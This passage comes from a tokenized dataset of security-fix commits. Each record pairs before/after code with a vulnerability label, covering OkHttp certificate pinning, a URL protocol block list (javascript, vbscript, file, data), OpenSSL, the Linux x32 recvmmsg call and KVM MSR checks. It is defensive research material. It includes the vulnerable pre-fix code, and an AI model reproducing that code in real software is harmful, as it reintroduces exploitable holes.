",", "certA", ",", "root", ")", ",", "council", ".", "clean", "(", "list", "(", "certB", ",", "certA", ",", "root", ")", "))", ";", "CertificateChainCleaner", "council", "=", "new", "CertificateChainCleaner", "(", "new", "RealTrustRootIndex", "(", "root", ".", "certificate", ")", ");", "assertEquals", "(", "list", "(", "certB", ",", "certA", ",", "root", ")", ",", "council", ".", "clean", "(", "list", "(", "certB", ",", "certA", ")", "))", ";", "/", "/", "Root", "is", "added", "!", "CertificateChainCleaner", "council", "=", "new", "CertificateChainCleaner", "(", "new", "RealTrustRootIndex", "(", "root", ".", "certificate", ")", ");", "assertEquals", "(", "list", "(", "certC", ",", "certB", ",", "certA", ",", "root", ")", ",", "council", ".", "clean", "(", "list", "(", "certC", ",", "certA", ",", "root", ",", "certB", ")", "))", ";", "CertificateChainCleaner", "council", "=", "new", "CertificateChainCleaner", "(", "new", "RealTrustRootIndex", "(", "root", ".", "certificate", ")", ");", "assertEquals", "(", "list", "(", "certC", ",", "certB", ",", "certA", ",", "root", ")", ",", "council", ".", "clean", "(", "list", "(", "certC", ",", "certA", ",", "certB", ")", "))", ";", "CertificateChainCleaner", "council", "=", "new", "CertificateChainCleaner", "(", "new", "RealTrustRootIndex", "(", "root", ".", "certificate", ")", ");", "council", ".", "clean", "(", "list", "(", "certB", ",", "certUnnecessary", ",", "certA", ",", "root", ")", "))", ";", "CertificateChainCleaner", "council", "=", "new", "CertificateChainCleaner", "(", "new", "RealTrustRootIndex", "(", "superRoot", ".", "certificate", ",", "root", ".", "certificate", ")", ");", "assertEquals", "(", "list", "(", "certB", ",", "certA", ",", "root", ")", ",", "council", ".", "clean", "(", "list", "(", "certB", ",", "certA", ",", "root", ",", "superRoot", ")", "))", ";", "import", "okhttp3", ".", "internal", ".", "tls", ".", "CertificateChainCleaner", ";", "import", "okhttp3", ".", "internal", ".", "tls", ".", "TrustRootIndex", ";", "private", "final", "TrustRootIndex", "trustRootIndex", ";", "this", ".", "trustRootIndex", "=", "builder", ".", "trustRootIndex", ";", "if", "(", "trustRootIndex", "!", "=", "null", ")", "{", "peerCertificates", "=", "new", "CertificateChainCleaner", "(", "trustRootIndex", ")", ".", "clean", "(", "peerCertificates", ")", ";", "private", "TrustRootIndex", "trustRootIndex", ";", "this", ".", "trustRootIndex", "=", "certificatePinner", ".", "trustRootIndex", ";", "public", "Builder", "trustRootIndex", "(", "TrustRootIndex", "trustRootIndex", ")", "{", "this", ".", "trustRootIndex", "=", "trustRootIndex", ";", "import", "okhttp3", ".", "internal", ".", "tls", ".", "TrustRootIndex", ";", "final", "TrustRootIndex", "trustRootIndex", ";", "if", "(", "sslSocketFactory", "!", "=", "null", "&", "&", "builder", ".", "trustRootIndex", "=", "=", "null", ")", "{", "+", "\"", ",", "sslSocketFactory", "is", "\"", "+", "sslSocketFactory", ".", "getClass", "(", "))", ";", "this", ".", "trustRootIndex", "=", "Platform", ".", "get", "(", ").", "trustRootIndex", "(", "trustManager", ")", ";", ".", "trustRootIndex", "(", "trustRootIndex", ")", "this", ".", "trustRootIndex", "=", "builder", ".", "trustRootIndex", ";", "TrustRootIndex", "trustRootIndex", ";", "this", ".", "trustRootIndex", "=", "okHttpClient", ".", "trustRootIndex", ";", "this", ".", "trustRootIndex", "=", "null", ";", "import", "okhttp3", ".", "internal", ".", "tls", ".", "AndroidTrustRootIndex", ";", "import", "okhttp3", ".", "internal", ".", "tls", ".", "RealTrustRootIndex", ";", "import", "okhttp3", ".", "internal", ".", "tls", ".", "TrustRootIndex", ";", "public", "TrustRootIndex", "trustRootIndex", "(", "X509TrustManager", "trustManager", ")", "{", "return", "new", "RealTrustRootIndex", "(", "trustManager", ".", "getAcceptedIssuers", "(", "))", ";", "}", "@", "Override", "public", "TrustRootIndex", "trustRootIndex", "(", "X509TrustManager", "trustManager", ")", "{", "TrustRootIndex", "result", "=", "AndroidTrustRootIndex", ".", "get", "(", "trustManager", ")", ";", "if", "(", "result", "!", "=", "null", ")", "return", "result", ";", "return", "super", ".", "trustRootIndex", "(", "trustManager", ")", ";", "}", "/", "*", "*", "Copyright", "(", "C", ")", "2016", "Square", ",", "Inc", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "okhttp3", ".", "internal", ".", "tls", ";", "import", "java", ".", "lang", ".", "reflect", ".", "InvocationTargetException", ";", "import", "java", ".", "lang", ".", "reflect", ".", "Method", ";", "import", "java", ".", "security", ".", "cert", ".", "TrustAnchor", ";", "import", "java", ".", "security", ".", "cert", ".", "X509Certificate", ";", "import", "javax", ".", "net", ".", "ssl", ".", "X509TrustManager", ";", "/", "**", "*", "A", "index", "of", "trusted", "root", "certificates", "that", "exploits", "knowledge", "of", "Android", "implementation", "details", ".", "*", "This", "class", "is", "potentially", "much", "faster", "to", "initialize", "than", "{", "@", "link", "RealTrustRootIndex", "}", "because", "*", "it", "doesn", "'", "t", "need", "to", "load", "and", "index", "trusted", "CA", "certificates", ".", "*", "/", "public", "final", "class", "AndroidTrustRootIndex", "implements", "TrustRootIndex", "{", "private", "final", "X509TrustManager", "trustManager", ";", "private", "final", "Method", "findByIssuerAndSignatureMethod", ";", "public", "AndroidTrustRootIndex", "(", "X509TrustManager", "trustManager", ",", "Method", "findByIssuerAndSignatureMethod", ")", "{", "this", ".", "findByIssuerAndSignatureMethod", "=", "findByIssuerAndSignatureMethod", ";", "this", ".", "trustManager", "=", "trustManager", ";", "}", "@", "Override", "public", "X509Certificate", "findByIssuerAndSignature", "(", "X509Certificate", "cert", ")", "{", "try", "{", "TrustAnchor", "trustAnchor", "=", "(", "TrustAnchor", ")", "findByIssuerAndSignatureMethod", ".", "invoke", "(", "trustManager", ",", "cert", ")", ";", "return", "trustAnchor", ".", "getTrustedCert", "(", ");", "}", "catch", "(", "IllegalAccessException", "e", ")", "{", "throw", "new", "AssertionError", "(", ");", "}", "catch", "(", "InvocationTargetException", "e", ")", "{", "return", "null", ";", "}", "}", "public", "static", "TrustRootIndex", "get", "(", "X509TrustManager", "trustManager", ")", "{", "/", "/", "From", "org", ".", "conscrypt", ".", "TrustManagerImpl", ",", "we", "want", "the", "method", "with", "this", "signature", ":", "/", "/", "private", "TrustAnchor", "findTrustAnchorByIssuerAndSignature", "(", "X509Certificate", "lastCert", ")", ";", "try", "{", "Method", "method", "=", "trustManager", ".", "getClass", "(", ").", "getDeclaredMethod", "(", "\"", "findTrustAnchorByIssuerAndSignature", "\"", ",", "X509Certificate", ".", "class", ")", ";", "method", ".", "setAccessible", "(", "true", ")", ";", "return", "new", "AndroidTrustRootIndex", "(", "trustManager", ",", "method", ")", ";", "}", "catch", "(", "NoSuchMethodException", "e", ")", "{", "return", "null", ";", "}", "}", "}", "@", "@", "-", "17", ",", "56", "+", "17", ",", "43", "@", "@", "*", "Computes", "the", "effective", "certificate", "chain", "from", "the", "raw", "array", "returned", "by", "Java", "'", "s", "built", "in", "TLS", "APIs", ".", "*", "Cleaning", "a", "chain", "returns", "a", "list", "of", "certificates", "where", "the", "first", "element", "is", "{", "@", "code", "chain", "[", "0", "]", "},", "each", "*", "certificate", "is", "signed", "by", "the", "certificate", "that", "follows", ",", "and", "the", "last", "certificate", "is", "a", "trusted", "CA", "*", "certificate", ".", "*", "*", "<", "p", ">", "Use", "of", "the", "chain", "cleaner", "is", "necessary", "to", "omit", "unexpected", "certificates", "that", "aren", "'", "t", "relevant", "to", "*", "the", "TLS", "handshake", "and", "to", "extract", "the", "trusted", "CA", "certificate", "for", "the", "benefit", "of", "certificate", "*", "pinning", ".", "public", "final", "class", "CertificateChainCleaner", "{", "private", "final", "TrustRootIndex", "trustRootIndex", ";", "public", "CertificateChainCleaner", "(", "TrustRootIndex", "trustRootIndex", ")", "{", "this", ".", "trustRootIndex", "=", "trustRootIndex", ";", "*", "Returns", "a", "cleaned", "chain", "for", "{", "@", "code", "chain", "}", ".", "*", "This", "is", "unexpected", "unless", "the", "trust", "root", "index", "in", "this", "class", "has", "a", "different", "trust", "manager", "than", "*", "what", "was", "used", "to", "establish", "{", "@", "code", "chain", "}", ".", "public", "List", "<", "Certificate", ">", "clean", "(", "List", "<", "Certificate", ">", "chain", ")", "throws", "SSLPeerUnverifiedException", "{", "X509Certificate", "caCert", "=", "trustRootIndex", ".", "findByIssuerAndSignature", "(", "toVerify", ")", ";", "if", "(", "caCert", "!", "=", "null", ")", "{", "/", "*", "*", "Copyright", "(", "C", ")", "2016", "Square", ",", "Inc", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "okhttp3", ".", "internal", ".", "tls", ";", "import", "java", ".", "security", ".", "PublicKey", ";", "import", "java", ".", "security", ".", "cert", ".", "X509Certificate", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "LinkedHashMap", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "javax", ".", "security", ".", "auth", ".", "x500", ".", "X500Principal", ";", "public", "final", "class", "RealTrustRootIndex", "implements", "TrustRootIndex", "{", "private", "final", "Map", "<", "X500Principal", ",", "List", "<", "X509Certificate", ">", ">", "subjectToCaCerts", ";", "public", "RealTrustRootIndex", "(", "X509Certificate", ".", "..", "caCerts", ")", "{", "subjectToCaCerts", "=", "new", "LinkedHashMap", "<", ">(", ");", "for", "(", "X509Certificate", "caCert", ":", "caCerts", ")", "{", "X500Principal", "subject", "=", "caCert", ".", "getSubjectX500Principal", "(", ");", "List", "<", "X509Certificate", ">", "subjectCaCerts", "=", "subjectToCaCerts", ".", "get", "(", "subject", ")", ";", "if", "(", "subjectCaCerts", "=", "=", "null", ")", "{", "subjectCaCerts", "=", "new", "ArrayList", "<", ">(", "1", ")", ";", "subjectToCaCerts", ".", "put", "(", "subject", ",", "subjectCaCerts", ")", ";", "}", "subjectCaCerts", ".", "add", "(", "caCert", ")", ";", "}", "}", "@", "Override", "public", "X509Certificate", "findByIssuerAndSignature", "(", "X509Certificate", "cert", ")", "{", "X500Principal", "issuer", "=", "cert", ".", "getIssuerX500Principal", "(", ");", "List", "<", "X509Certificate", ">", "subjectCaCerts", "=", "subjectToCaCerts", ".", "get", "(", "issuer", ")", ";", "if", "(", "subjectCaCerts", "=", "=", "null", ")", "return", "null", ";", "for", "(", "X509Certificate", "caCert", ":", "subjectCaCerts", ")", "{", "PublicKey", "publicKey", "=", "caCert", ".", "getPublicKey", "(", ");", "try", "{", "cert", ".", "verify", "(", "publicKey", ")", ";", "return", "caCert", ";", "}", "catch", "(", "Exception", "ignored", ")", "{", "}", "}", "return", "null", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "23", "@", "@", "/", "*", "*", "Copyright", "(", "C", ")", "2016", "Square", ",", "Inc", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "okhttp3", ".", "internal", ".", "tls", ";", "import", "java", ".", "security", ".", "cert", ".", "X509Certificate", ";", "public", "interface", "TrustRootIndex", "{", "/", "**", "Returns", "the", "trusted", "CA", "certificate", "that", "signed", "{", "@", "code", "cert", "}", ".", "*", "/", "X509Certificate", "findByIssuerAndSignature", "(", "X509Certificate", "cert", ")", ";", "}</s>import", "okhttp3", ".", "internal", ".", "tls", ".", "CertificateAuthorityCouncil", ";", "public", "final", "class", "CertificateAuthorityCouncilTest", "{", "CertificateAuthorityCouncil", "council", "=", "new", "CertificateAuthorityCouncil", "(", "root", ".", "certificate", ")", ";", "assertEquals", "(", "list", "(", "root", ")", ",", "council", ".", "normalizeCertificateChain", "(", "list", "(", "root", ")", "))", ";", "CertificateAuthorityCouncil", "council", "=", "new", "CertificateAuthorityCouncil", "(", ");", "council", ".", "normalizeCertificateChain", "(", "list", "(", "root", ")", ");", "CertificateAuthorityCouncil", "council", "=", "new", "CertificateAuthorityCouncil", "(", "root", ".", "certificate", ")", ";", "assertEquals", "(", "list", "(", "certB", ",", "certA", ",", "root", ")", ",", "council", ".", "normalizeCertificateChain", "(", "list", "(", "certB", ",", "certA", ",", "root", ")", "))", ";", "CertificateAuthorityCouncil", "council", "=", "new", "CertificateAuthorityCouncil", "(", "root", ".", "certificate", ")", ";", "assertEquals", "(", "list", "(", "certB", ",", "certA", ",", "root", ")", ",", "council", ".", "normalizeCertificateChain", "(", "list", "(", "certB", ",", "certA", ")", "))", ";", "/", "/", "Root", "is", "added", "!", "CertificateAuthorityCouncil", "council", "=", "new", "CertificateAuthorityCouncil", "(", "root", ".", "certificate", ")", ";", "assertEquals", "(", "list", "(", "certC", ",", "certB", ",", "certA", ",", "root", ")", ",", "council", ".", "normalizeCertificateChain", "(", "list", "(", "certC", ",", "certA", ",", "root", ",", "certB", ")", "))", ";", "CertificateAuthorityCouncil", "council", "=", "new", "CertificateAuthorityCouncil", "(", "root", ".", "certificate", ")", ";", "assertEquals", "(", "list", "(", "certC", ",", "certB", ",", "certA", ",", "root", ")", ",", "council", ".", "normalizeCertificateChain", "(", "list", "(", "certC", ",", "certA", ",", "certB", ")", "))", ";", "CertificateAuthorityCouncil", "council", "=", "new", "CertificateAuthorityCouncil", "(", "root", ".", "certificate", ")", ";", "council", ".", "normalizeCertificateChain", "(", "list", "(", "certB", ",", "certUnnecessary", ",", "certA", ",", "root", ")", "))", ";", "CertificateAuthorityCouncil", "council", "=", "new", "CertificateAuthorityCouncil", "(", "superRoot", ".", "certificate", ",", "root", ".", "certificate", ")", ";", "assertEquals", "(", "list", "(", "certB", ",", "certA", ",", "root", ")", ",", "council", ".", "normalizeCertificateChain", "(", "list", "(", "certB", ",", "certA", ",", "root", ",", "superRoot", ")", "))", ";", "import", "okhttp3", ".", "internal", ".", "tls", ".", "CertificateAuthorityCouncil", ";", "private", "final", "CertificateAuthorityCouncil", "certificateAuthorityCouncil", ";", "this", ".", "certificateAuthorityCouncil", "=", "builder", ".", "certificateAuthorityCouncil", ";", "if", "(", "certificateAuthorityCouncil", "!", "=", "null", ")", "{", "peerCertificates", "=", "certificateAuthorityCouncil", ".", "normalizeCertificateChain", "(", "peerCertificates", ")", ";", "private", "CertificateAuthorityCouncil", "certificateAuthorityCouncil", ";", "this", ".", "certificateAuthorityCouncil", "=", "certificatePinner", ".", "certificateAuthorityCouncil", ";", "Builder", "certificateAuthorityCouncil", "(", "CertificateAuthorityCouncil", "certificateAuthorityCouncil", ")", "{", "this", ".", "certificateAuthorityCouncil", "=", "certificateAuthorityCouncil", ";", "import", "okhttp3", ".", "internal", ".", "tls", ".", "CertificateAuthorityCouncil", ";", "final", "CertificateAuthorityCouncil", "certificateAuthorityCouncil", ";", "if", "(", "sslSocketFactory", "!", "=", "null", "&", "&", "builder", ".", "certificateAuthorityCouncil", "=", "=", "null", ")", "{", "this", ".", "certificateAuthorityCouncil", "=", "new", "CertificateAuthorityCouncil", "(", "trustManager", ".", "getAcceptedIssuers", "(", "))", ";", ".", "certificateAuthorityCouncil", "(", "certificateAuthorityCouncil", ")", "this", ".", "certificateAuthorityCouncil", "=", "builder", ".", "certificateAuthorityCouncil", ";", "CertificateAuthorityCouncil", "certificateAuthorityCouncil", ";", "this", ".", "certificateAuthorityCouncil", "=", "okHttpClient", ".", "certificateAuthorityCouncil", ";", "this", ".", "certificateAuthorityCouncil", "=", "null", ";", "import", "java", ".", "security", ".", "PublicKey", ";", "import", "java", ".", "util", ".", "LinkedHashMap", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "javax", ".", "security", ".", "auth", ".", "x500", ".", "X500Principal", ";", "*", "A", "set", "of", "trusted", "Certificate", "Authority", "(", "CA", ")", "certificates", "that", "are", "trusted", "to", "verify", "the", "TLS", "*", "certificates", "offered", "by", "remote", "web", "servers", ".", "public", "final", "class", "CertificateAuthorityCouncil", "{", "private", "final", "Map", "<", "X500Principal", ",", "List", "<", "X509Certificate", ">", ">", "subjectToCaCerts", "=", "new", "LinkedHashMap", "<", ">(", ");", "public", "CertificateAuthorityCouncil", "(", "X509Certificate", ".", "..", "caCerts", ")", "{", "for", "(", "X509Certificate", "caCert", ":", "caCerts", ")", "{", "X500Principal", "subject", "=", "caCert", ".", "getSubjectX500Principal", "(", ");", "List", "<", "X509Certificate", ">", "subjectCaCerts", "=", "subjectToCaCerts", ".", "get", "(", "subject", ")", ";", "if", "(", "subjectCaCerts", "=", "=", "null", ")", "{", "subjectCaCerts", "=", "new", "ArrayList", "<", ">(", "1", ")", ";", "subjectToCaCerts", ".", "put", "(", "subject", ",", "subjectCaCerts", ")", ";", "}", "subjectCaCerts", ".", "add", "(", "caCert", ")", ";", "}", "*", "Computes", "the", "effective", "certificate", "chain", "from", "the", "raw", "array", "returned", "by", "Java", "'", "s", "built", "in", "TLS", "*", "APIs", ".", "This", "method", "returns", "a", "list", "of", "certificates", "where", "the", "first", "element", "is", "{", "@", "code", "chain", "[", "0", "]", "},", "*", "each", "certificate", "is", "signed", "by", "the", "certificate", "that", "follows", ",", "and", "the", "last", "certificate", "is", "a", "*", "trusted", "CA", "certificate", ".", "*", "*", "<", "p", ">", "Use", "of", "this", "method", "is", "necessary", "to", "omit", "unexpected", "certificates", "that", "aren", "'", "t", "relevant", "to", "the", "*", "TLS", "handshake", "and", "to", "extract", "the", "trusted", "CA", "certificate", "for", "the", "benefit", "of", "certificate", "pinning", ".", "*", "This", "is", "unexpected", "unless", "the", "X509", "trust", "manager", "in", "this", "class", "is", "different", "from", "the", "trust", "*", "manager", "that", "was", "used", "to", "establish", "{", "@", "code", "chain", "}", ".", "public", "List", "<", "Certificate", ">", "normalizeCertificateChain", "(", "List", "<", "Certificate", ">", "chain", ")", "throws", "SSLPeerUnverifiedException", "{", "X509Certificate", "caCert", "=", "findByIssuerAndSignature", "(", "toVerify", ")", ";", "if", "(", "caCert", "!", "=", "null", "&", "&", "verifySignature", "(", "toVerify", ",", "caCert", ")", ")", "{", "/", "**", "Returns", "the", "trusted", "CA", "certificate", "that", "signed", "{", "@", "code", "cert", "}", ".", "*", "/", "private", "X509Certificate", "findByIssuerAndSignature", "(", "X509Certificate", "cert", ")", "{", "X500Principal", "issuer", "=", "cert", ".", "getIssuerX500Principal", "(", ");", "List", "<", "X509Certificate", ">", "subjectCaCerts", "=", "subjectToCaCerts", ".", "get", "(", "issuer", ")", ";", "if", "(", "subjectCaCerts", "=", "=", "null", ")", "return", "null", ";", "for", "(", "X509Certificate", "caCert", ":", "subjectCaCerts", ")", "{", "PublicKey", "publicKey", "=", "caCert", ".", "getPublicKey", "(", ");", "try", "{", "cert", ".", "verify", "(", "publicKey", ")", ";", "return", "caCert", ";", "}", "catch", "(", "Exception", "ignored", ")", "{", "}", "}", "return", "null", ";", "}"], "docstring_tokens": ["bypassing", "certificate", "pinning"]}
{"contents": ["Outlaw", "data:", "URLs", "by", "default", "See", "#227.", "It", "would", "still", "be", "better", "to", "switch", "to", "a", "whitelist", "but", "this", "is", "an", "improvement."], "code_tokens": ["var", "BAD_PROTOCOLS", "=", "[", "'", "vbscript", "'", ",", "'", "javascript", "'", ",", "'", "file", "'", ",", "'", "data", "'", "]", ";</s>var", "BAD_PROTOCOLS", "=", "[", "'", "vbscript", "'", ",", "'", "javascript", "'", ",", "'", "file", "'", "]", ";"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["Fix", "Check", "session_cert", "is", "not", "NULL", "before", "dereferencing", "it."], "code_tokens": ["if", "(", "s", "-", ">", "session", "-", ">", "sess_cert", "=", "=", "NULL", ")", "{", "ssl3_send_alert", "(", "s", ",", "SSL3_AL_FATAL", ",", "SSL_AD_UNEXPECTED_MESSAGE", ")", ";", "SSLerr", "(", "SSL_F_SSL3_SEND_CLIENT_KEY_EXCHANGE", ",", "SSL_R_UNEXPECTED_MESSAGE", ")", ";", "goto", "err", ";", "}</s>"], "docstring_tokens": ["update", "your", "vulnerable", "system"]}
{"contents": ["x86,", "x32:", "Correct", "invalid", "use", "of", "user", "timespec", "in", "the", "kernel", "The", "x32", "case", "for", "the", "recvmsg()", "timout", "handling", "is", "broken:", "asmlinkage", "long", "compat_sys_recvmmsg(int", "fd,", "struct", "compat_mmsghdr", "__user", "*mmsg,", "unsigned", "int", "vlen,", "unsigned", "int", "flags,", "struct", "compat_timespec", "__user", "*timeout)", "{", "int", "datagrams;", "struct", "timespec", "ktspec;", "if", "(flags", "&", "MSG_CMSG_COMPAT)", "return", "-EINVAL;", "if", "(COMPAT_USE_64BIT_TIME)", "return", "__sys_recvmmsg(fd,", "(struct", "mmsghdr", "__user", "*)mmsg,", "vlen,", "flags", "|", "MSG_CMSG_COMPAT,", "(struct", "timespec", "*)", "timeout);", "...", "The", "timeout", "pointer", "parameter", "is", "provided", "by", "userland", "(hence", "the", "__user", "annotation)", "but", "for", "x32", "syscalls", "it's", "simply", "cast", "to", "a", "kernel", "pointer", "and", "is", "passed", "to", "__sys_recvmmsg", "which", "will", "eventually", "directly", "dereference", "it", "for", "both", "reading", "and", "writing.", "Other", "callers", "to", "__sys_recvmmsg", "properly", "copy", "from", "userland", "to", "the", "kernel", "first.", "The", "bug", "was", "introduced", "by", "commit", "ee4fa23c4bfc", "(\"compat:", "Use", "COMPAT_USE_64BIT_TIME", "in", "net/compat.c\")", "and", "should", "affect", "all", "kernels", "since", "3.4", "(and", "perhaps", "vendor", "kernels", "if", "they", "backported", "x32", "support", "along", "with", "this", "code).", "Note", "that", "CONFIG_X86_X32_ABI", "gets", "enabled", "at", "build", "time", "and", "only", "if", "CONFIG_X86_X32", "is", "enabled", "and", "ld", "can", "build", "x32", "executables.", "Other", "uses", "of", "COMPAT_USE_64BIT_TIME", "seem", "fine.", "This", "addresses", ".", "Signed-off-by:", "PaX", "Team", "<pageexec@freemail.hu>", "Signed-off-by:", "H.", "Peter", "Anvin", "<hpa@linux.intel.com>", "Cc:", "<stable@vger.kernel.org>", "#", "v3.4+", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "compat_get_timespec", "(", "&", "ktspec", ",", "timeout", ")", ")", "if", "(", "datagrams", ">", "0", "&", "&", "compat_put_timespec", "(", "&", "ktspec", ",", "timeout", ")", ")</s>if", "(", "COMPAT_USE_64BIT_TIME", ")", "return", "__sys_recvmmsg", "(", "fd", ",", "(", "struct", "mmsghdr", "__user", "*", ")", "mmsg", ",", "vlen", ",", "flags", "|", "MSG_CMSG_COMPAT", ",", "(", "struct", "timespec", "*", ")", "timeout", ")", ";", "if", "(", "get_compat_timespec", "(", "&", "ktspec", ",", "timeout", ")", ")", "if", "(", "datagrams", ">", "0", "&", "&", "put_compat_timespec", "(", "&", "ktspec", ",", "timeout", ")", ")"], "docstring_tokens": ["corrupt", "memory", "and", "execute", "arbitrary", "code", "on", "the", "system"]}
{"contents": ["KVM:", "x86:", "Check", "non-canonical", "addresses", "upon", "WRMSR", "Upon", "WRMSR,", "the", "CPU", "should", "inject", "#GP", "if", "a", "non-canonical", "value", "(address)", "is", "written", "to", "certain", "MSRs.", "The", "behavior", "is", "\"almost\"", "identical", "for", "AMD", "and", "Intel", "(ignoring", "MSRs", "that", "are", "not", "implemented", "in", "either", "architecture", "since", "they", "would", "anyhow", "#GP).", "However,", "IA32_SYSENTER_ESP", "and", "IA32_SYSENTER_EIP", "cause", "#GP", "if", "non-canonical", "address", "is", "written", "on", "Intel", "but", "not", "on", "AMD", "(which", "ignores", "the", "top", "32-bits).", "Accordingly,", "this", "patch", "injects", "a", "#GP", "on", "the", "MSRs", "which", "behave", "identically", "on", "Intel", "and", "AMD.", "To", "eliminate", "the", "differences", "between", "the", "architecutres,", "the", "value", "which", "is", "written", "to", "IA32_SYSENTER_ESP", "and", "IA32_SYSENTER_EIP", "is", "turned", "to", "canonical", "value", "before", "writing", "instead", "of", "injecting", "a", "#GP.", "Some", "references", "from", "Intel", "and", "AMD", "manuals:", "According", "to", "Intel", "SDM", "description", "of", "WRMSR", "instruction", "#GP", "is", "expected", "on", "WRMSR", "\"If", "the", "source", "register", "contains", "a", "non-canonical", "address", "and", "ECX", "specifies", "one", "of", "the", "following", "MSRs:", "IA32_DS_AREA,", "IA32_FS_BASE,", "IA32_GS_BASE,", "IA32_KERNEL_GS_BASE,", "IA32_LSTAR,", "IA32_SYSENTER_EIP,", "IA32_SYSENTER_ESP.\"", "According", "to", "AMD", "manual", "instruction", "manual:", "LSTAR/CSTAR", "(SYSCALL):", "\"The", "WRMSR", "instruction", "loads", "the", "target", "RIP", "into", "the", "LSTAR", "and", "CSTAR", "registers.", "If", "an", "RIP", "written", "by", "WRMSR", "is", "not", "in", "canonical", "form,", "a", "general-protection", "exception", "(#GP)", "occurs.\"", "IA32_GS_BASE", "and", "IA32_FS_BASE", "(WRFSBASE/WRGSBASE):", "\"The", "address", "written", "to", "the", "base", "field", "must", "be", "in", "canonical", "form", "or", "a", "#GP", "fault", "will", "occur.\"", "IA32_KERNEL_GS_BASE", "(SWAPGS):", "\"The", "address", "stored", "in", "the", "KernelGSbase", "MSR", "must", "be", "in", "canonical", "form.\"", "This", "patch", "fixes", ".", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Nadav", "Amit", "<namit@cs.technion.ac.il>", "Signed-off-by:", "Paolo", "Bonzini", "<pbonzini@redhat.com>"], "code_tokens": ["static", "inline", "u64", "get_canonical", "(", "u64", "la", ")", "{", "return", "(", "(", "int64_t", ")", "la", "<", "<", "16", ")", ">", ">", "16", ";", "}", "static", "inline", "bool", "is_noncanonical_address", "(", "u64", "la", ")", "{", "#", "ifdef", "CONFIG_X86_64", "return", "get_canonical", "(", "la", ")", "!", "=", "la", ";", "#", "else", "return", "false", ";", "#", "endif", "}", "if", "(", "kvm_set_msr", "(", "&", "svm", "-", ">", "vcpu", ",", "&", "msr", ")", ")", "{", "if", "(", "kvm_set_msr", "(", "vcpu", ",", "&", "msr", ")", "!", "=", "0", ")", "{", "switch", "(", "msr", "-", ">", "index", ")", "{", "case", "MSR_FS_BASE", ":", "case", "MSR_GS_BASE", ":", "case", "MSR_KERNEL_GS_BASE", ":", "case", "MSR_CSTAR", ":", "case", "MSR_LSTAR", ":", "if", "(", "is_noncanonical_address", "(", "msr", "-", ">", "data", ")", ")", "return", "1", ";", "break", ";", "case", "MSR_IA32_SYSENTER_EIP", ":", "case", "MSR_IA32_SYSENTER_ESP", ":", "/", "*", "*", "IA32_SYSENTER_ESP", "and", "IA32_SYSENTER_EIP", "cause", "#", "GP", "if", "*", "non", "-", "canonical", "address", "is", "written", "on", "Intel", "but", "not", "on", "*", "AMD", "(", "which", "ignores", "the", "top", "32", "-", "bits", ",", "because", "it", "does", "*", "not", "implement", "64", "-", "bit", "SYSENTER", ")", ".", "*", "*", "64", "-", "bit", "code", "should", "hence", "be", "able", "to", "write", "a", "non", "-", "canonical", "*", "value", "on", "AMD", ".", "Making", "the", "address", "canonical", "ensures", "that", "*", "vmentry", "does", "not", "fail", "on", "Intel", "after", "writing", "a", "non", "-", "canonical", "*", "value", ",", "and", "that", "something", "deterministic", "happens", "if", "the", "guest", "*", "invokes", "64", "-", "bit", "SYSENTER", ".", "*", "/", "msr", "-", ">", "data", "=", "get_canonical", "(", "msr", "-", ">", "data", ")", ";", "}", "EXPORT_SYMBOL_GPL", "(", "kvm_set_msr", ")", ";</s>if", "(", "svm_set_msr", "(", "&", "svm", "-", ">", "vcpu", ",", "&", "msr", ")", ")", "{", "if", "(", "vmx_set_msr", "(", "vcpu", ",", 